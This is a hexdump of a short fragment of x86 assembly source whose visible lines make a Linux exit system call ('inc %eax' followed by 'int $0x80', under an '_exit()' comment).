00002f10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 69 6e  |              in|
00002f20  74 20 24 30 78 38 30 20  0d 0a 0d 0a 0d 0a 20 20  |t $0x80 ......  |
00002f30  20 20 20 20 20 20 20 20  20 20 20 20 23 2d 2d 2d  |            #---|
00002f40  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00002f60  2d 2d 2d 2d 2d 2d 2d 23  0d 0a 20 20 20 20 20 20  |-------#..      |
00002f70  20 20 20 20 20 20 20 20  23 20 5f 65 78 69 74 28  |        # _exit(|
00002f80  29 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |)               |
00002f90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002fa0  20 20 20 23 0d 0a 20 20  20 20 20 20 20 20 20 20  |   #..          |
00002fb0  20 20 20 20 23 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |    #-----------|
00002fc0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00002fd0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 23  |---------------#|
00002fe0  0d 0a 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |....            |
00002ff0  20 20 20 20 69 6e 63 20  25 65 61 78 0d 0a 20 20  |    inc %eax..  |
00003000  20 20 20 20 20 20 20 20  20 20 20 20 20 20 69 6e  |              in|
00003010  74 20 24 30 78 38 30                              |t $0x80|
00003017
